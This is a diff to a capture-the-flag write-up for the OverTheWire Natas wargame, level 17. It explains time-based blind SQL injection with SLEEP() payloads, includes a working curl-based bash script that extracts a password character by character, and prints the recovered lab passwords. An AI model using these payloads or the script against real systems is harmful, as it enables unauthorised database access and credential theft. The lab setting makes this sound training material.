@@ -1283,9 +1283,189 @@ Don't rely on blacklisting certain characters for security!
 
 ### Level 17
 
-- **Date**: 2026-03-31
+- **Date**: 2026-04-01
 - **URL**: `http://natas17.natas.labs.overthewire.org`
 - **Password**: `EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC`
+- **Tools**: Web Browser, `SQL`, `Bash`, `curl`
+
+#### The Solution
+
+Use CTRL + U to view the page source. And notice:
+
+```html
+<div id="content">
+
+<form action="index.php" method="POST">
+Username: <input name="username"><br>
+<input type="submit" value="Check existence" />
+</form>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+```
+
+Let's check out that source code (URL/index-source.html):
+
+```php
+<?php
+
+/*
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+*/
+
+if(array_key_exists("username", $_REQUEST)) {
+    $link = mysqli_connect('localhost', 'natas17', '<censored>');
+    mysqli_select_db($link, 'natas17');
+
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+    if(array_key_exists("debug", $_GET)) {
+        echo "Executing query: $query<br>";
+    }
+
+    $res = mysqli_query($link, $query);
+    if($res) {
+    if(mysqli_num_rows($res) > 0) {
+        //echo "This user exists.<br>";
+    } else {
+        //echo "This user doesn't exist.<br>";
+    }
+    } else {
+        //echo "Error in query.<br>";
+    }
+
+    mysqli_close($link);
+} else {
+?>
+```
+
+Notice that the output messages have been removed, so we can't rely on blind SQL injection based on response content anymore.
+
+Can we somehow know if the query executed successfully or not?
+
+But what if we use **time**?
+
+In SQL, the `SLEEP()` function can be used to delay execution.
+
+Put `natas18" AND SLEEP(5) --` as the username and submit the form.
+
+- If the page takes 5 seconds to load, it means the query executed successfully and the user exists!
+- If the page loads immediately, it means the query did not execute successfully and the user does not exist!
+
+And you will see that the page takes 5 seconds to load, which means the user `natas18` exists!
+
+Now we can use `natas18" AND password LIKE BINARY "a%" AND SLEEP(5) --` to extract the password <u>character by character</u> again, but this time based on **response time** instead of response content!
+
+Let's automate this with a script again!
+
+[level-17\time_based_blind_sql.bash](level-17\time_based_blind_sql.bash)
+```bash
+#!/bin/bash
+
+[[ -z "$1" ]] && { echo "Usage: $0 <password>"; exit 1; }
+
+URL="http://natas17.natas.labs.overthewire.org/"
+AUTH="natas17:$1"
+
+chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+password=""
+
+SLEEP_TIME=3
+THRESHOLD=2500   # ms
+
+for i in $(seq 1 32); do
+  for c in $(echo $chars | fold -w1); do
+
+    attempt="${password}${c}"
+
+    # First measurement
+    start=$(date +%s%3N) # Millisecond precision!
+
+    curl -s -u $AUTH \
+      --data "username=natas18\" AND IF(password LIKE BINARY \"${attempt}%\", SLEEP(${SLEEP_TIME}), 0) #" \
+      "$URL" > /dev/null
+
+    end=$(date +%s%3N) # Millisecond precision!
+    elapsed=$((end - start))
+
+    if [[ $elapsed -ge $THRESHOLD ]]; then
+
+      # Confirm (second measurement)
+      start=$(date +%s%3N)
+
+      curl -s -u $AUTH \
+        --data "username=natas18\" AND IF(password LIKE BINARY \"${attempt}%\", SLEEP(${SLEEP_TIME}), 0) #" \
+        "$URL" > /dev/null
+
+      end=$(date +%s%3N)
+      elapsed2=$((end - start))
+
+      if [[ $elapsed2 -ge $THRESHOLD ]]; then
+        password+=$c
+        len=${#password} # Avoid syntax error in echo.
+        echo "[+] $password (${len}/32)"
+        break
+      fi
+
+    fi
+
+  done
+done
+
+echo
+echo "[✔] Password: $password"
+```
+
+Run `bash level-17/time_based_blind_sql.bash EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC` and you will get:
+```powershell
+[+] 6 (1/32)
+[+] 6O (2/32)
+[+] 6OG (3/32)
+[+] 6OG1 (4/32)
+[+] 6OG1P (5/32)
+[+] 6OG1Pb (6/32)
+[+] 6OG1PbK (7/32)
+[+] 6OG1PbKd (8/32)
+[+] 6OG1PbKdV (9/32)
+[+] 6OG1PbKdVj (10/32)
+[+] 6OG1PbKdVjy (11/32)
+[+] 6OG1PbKdVjyB (12/32)
+[+] 6OG1PbKdVjyBl (13/32)
+[+] 6OG1PbKdVjyBlp (14/32)
+[+] 6OG1PbKdVjyBlpx (15/32)
+[+] 6OG1PbKdVjyBlpxg (16/32)
+[+] 6OG1PbKdVjyBlpxgD (17/32)
+[+] 6OG1PbKdVjyBlpxgD4 (18/32)
+[+] 6OG1PbKdVjyBlpxgD4D (19/32)
+[+] 6OG1PbKdVjyBlpxgD4DD (20/32)
+[+] 6OG1PbKdVjyBlpxgD4DDb (21/32)
+[+] 6OG1PbKdVjyBlpxgD4DDbR (22/32)
+[+] 6OG1PbKdVjyBlpxgD4DDbRG (23/32)
+[+] 6OG1PbKdVjyBlpxgD4DDbRG6 (24/32)
+[+] 6OG1PbKdVjyBlpxgD4DDbRG6Z (25/32)
+[+] 6OG1PbKdVjyBlpxgD4DDbRG6ZL (26/32)
+[+] 6OG1PbKdVjyBlpxgD4DDbRG6ZLl (27/32)
+[+] 6OG1PbKdVjyBlpxgD4DDbRG6ZLlC (28/32)
+[+] 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCG (29/32)
+[+] 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGg (30/32)
+[+] 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgC (31/32)
+[+] 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ (32/32)
+
+[✔] Password: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
+```
+
+And the password for natas18 is `6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ`.
+
+#### The Lesson
+
+Prevent **SQL injection** from leaking data via timing (`SLEEP(...)`) attacks.
+
+### Level 18
+
+- **Date**: 2026-04-01
+- **URL**: `http://natas18.natas.labs.overthewire.org`
+- **Password**: `6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ`
 - **Tools**: Web Browser
 
 #### The Solution
